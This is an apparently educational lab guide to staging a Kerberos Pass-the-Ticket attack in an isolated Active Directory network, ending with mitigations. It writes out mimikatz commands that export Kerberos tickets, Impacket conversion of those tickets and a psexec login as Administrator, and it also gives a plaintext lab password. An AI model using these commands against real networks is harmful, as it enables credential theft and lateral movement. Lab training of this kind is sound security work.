# Pass-the-Ticket (PTT) Attack Lab

## 📍 Lab Progress

- [ ] Lab Overview
- [ ] Lab Network Architecture
- [ ] Lab Objectives
- [ ] Attack Flow
- [ ] Phase 1 — VMware Network
- [ ] Phase 2 — Existing Domain Controller
- [ ] Phase 3 — Create a Normal Domain User
- [ ] Phase 4 — Create a Second Windows VM
- [ ] Phase 5 — Join CLIENT01 to the Domain
- [ ] Phase 6 — Verify Kerberos
- [ ] Phase 7 — Understand Pass-the-Ticket
- [ ] Phase 8 — Install Impacket on Kali
- [ ] Phase 9 — Windows Kerberos Ticket Tools
- [ ] Phase 10 — Extract Kerberos Tickets
- [ ] Phase 11 — Convert `.kirbi` to `.ccache`
- [ ] Phase 12 — PTT Mitigation

---

## Lab Overview

This lab demonstrates the Pass-the-Ticket (PTT) concept in an isolated Active Directory environment using Windows Server 2022, a Windows 10/11 client, and Kali Linux.

The lab reuses the existing `HM.local` domain where possible.

## Lab Network Architecture

```
```
```
						 
						 
						 VMware Host-Only
                         192.168.56.0/24

              ┌──────────────────────────────┐
              │                              │
       Windows Server 2022              Windows 10/11
            DC01                         CLIENT01
       192.168.56.10                   192.168.56.30
              │                              │
              │       LAB.LOCAL              │
              └──────────────┬───────────────┘
                             │
                          Kali Linux
                           ATTACKER
                         192.168.56.20

```
The idea is:

```
Normal domain authentication

          ↓

Kerberos ticket exists

          ↓

Ticket becomes compromised

          ↓

Pass-the-Ticket simulation

          ↓

Access another domain resource

          ↓

Detection + investigation

```
## Phase 1 — VMware network

Use the same isolated network you've been using for your other AD labs.

Set:

Network: Host-Only

Subnet: 192.168.56.0/24

Configure:

|VM|Hostname|IP|
|---|---|---|
|Windows Server 2022|`DC01`|`192.168.56.10`|
|Kali|`KALI`|`192.168.56.20`|
|Windows 10/11|`CLIENT01`|`192.168.56.30`|

For all machines:

Subnet mask: 255.255.255.0

DNS:         192.168.56.10

For the isolated lab, you don't need an Internet gateway on this adapter.

---

# Phase 2 — Your Existing Domain Controller

If your existing AD domain is still:

HM.local

you can reuse it.

On DC01:

```
Get-ADDomain
```

Verify:

```
Get-ADDomainController
```

And:

```
ipconfig
```

You want:

DC01

192.168.56.10

HM.local

If your current lab uses a different domain/IP, keep those values consistently instead of creating another domain.

---

# Phase 3 — Create a Normal Domain User

Create a user that will be used for the lab.

For example:

Username: alice

Domain:   HM.local

PowerShell:

```
New-ADUser `
    -Name "Alice Lab" `
    -SamAccountName "alice" `
    -UserPrincipalName "alice@HM.local" `
    -AccountPassword (Read-Host -AsSecureString "Password") `
    -Enabled $true
```

Verify:

```
Get-ADUser alice
```

Keep `alice` as a **normal Domain User**.

Don't make her Domain Admin.

---

# Phase 4 — Create a Second Windows VM

This is the most useful addition to your lab.

Install Windows 10/11 or another Windows Server VM.

Give it:

Hostname: CLIENT01

IP:       192.168.56.30

DNS:      192.168.56.10

Test:

ping 192.168.56.10

Then:

```
nslookup HM.local
```

It should resolve through:

192.168.56.10

---

# Phase 5 — Join CLIENT01 to the Domain

On CLIENT01:

Settings

→ System

→ About

→ Domain or workgroup

→ Join this device to a local Active Directory domain

Use:

HM.local

Enter your domain administrator credentials when requested.

Restart the machine.

After reboot, log in as:

```
username: HM\alice
```
```
password: linux7$$@202425@
```

Verify:

```
whoami
```

Expected:

hm\alice

And:

```
hostname
```

Expected:

CLIENT01

---

# Phase 6 — Verify Kerberos

On CLIENT01, while logged in as `alice`:

klist

You should see Kerberos tickets.

You'll typically see a ticket associated with the domain authentication, including a TGT.

Conceptually:

```
alice

  │

  ▼

Kerberos Authentication

  │

  ▼

KDC/DC01

  │

  ├── TGT

  │

  └── Service Tickets
```

This is the important foundation for Pass-the-Ticket.

---

# Phase 7 — Understand Pass-the-Ticket

A normal Kerberos workflow looks like:

```
Alice

 │

 │ authenticates

 ▼

KDC

 │

 │ issues TGT

 ▼

Alice's session

 │

 │ requests service ticket

 ▼

File Server / Service

```

Pass-the-Ticket changes the scenario:

```
Valid Kerberos ticket

        ↓

Ticket becomes available to attacker

        ↓

Attacker injects/uses ticket

        ↓

Kerberos authentication

        ↓

Access to permitted service
```

The important point is that the attacker can potentially authenticate using the **ticket** without knowing the user's plaintext password.


# Phase 8 — Install Impacket on Kali

On Kali:

```
sudo apt update

sudo apt install impacket-scripts -y
```

Verify:

```
impacket-ticketer -h

or:

ticketer.py -h
```

Depending on your Kali package/version.

---

# Phase 9 — Windows Kerberos Ticket Tools

For the Windows side of your isolated lab, you can use a tool such as **Rubeus** to inspect and work with Kerberos tickets.

Your lab should treat this as a controlled red-team tool and keep it only inside the isolated VM environment.

The useful concepts to investigate are:

```
Rubeus

    ↓

Kerberos tickets

    ↓

TGT

    ↓

TGS

    ↓

Ticket injection

    ↓

Service authentication
```

OR

# Phase 10 — Extract Kerberos Tickets 

With Administrator privileges. 

run:

```
mimikatz.exe
privilege:debug
kerberos::list /export
kerberos::list
```

![Kerberos ticket export](../images/Pasted%20image%2020260818095631.png)


![Exported Kerberos tickets](../images/Pasted%20image%2020260818095708.png)


![Ticket files](../images/Pasted%20image%2020260818095822.png)


Tickets will export in the same directory as mimikatz.exe

now either download impacket-scripts in the target system or move these tickets to the attacker machine.

# Phase 11 — Convert `.kirbi` to `.ccache`

On Attacker machine:
```
impacket-ticketConverter ticket.kirbi ticket.ccache

export KRB5CCNAME=$PWD/administrator.ccache

echo $KRB5CCNAME
```

```
impacket-psexec -k -no-pass HM.LOCAL/Administrator@CLIENT01.HM.local
```

`-k` tells Impacket to use Kerberos credentials from `KRB5CCNAME`, and `-no-pass` prevents it from asking for a password. The current Impacket `psexec.py` documentation/code explicitly supports this behavior.


# Phase 12 — PTT Mitigation

- Put high-value administrative accounts in **Protected Users** where operationally appropriate.
- Mark privileged accounts **"Account is sensitive and cannot be delegated."**
- Avoid unnecessary **unconstrained delegation**.
- Prefer AES Kerberos encryption and eliminate legacy authentication where your environment permits.
- Use separate administrative accounts and tier administrative privileges.
- Keep domain controllers and clients patched.
- Monitor abnormal Kerberos authentication rather than relying only on endpoint malware detection.
- If you have evidence that the **KRBTGT secret was compromised**, follow Microsoft's incident-response procedure for resetting the KRBTGT password; this is an incident-response action, not routine hardening.
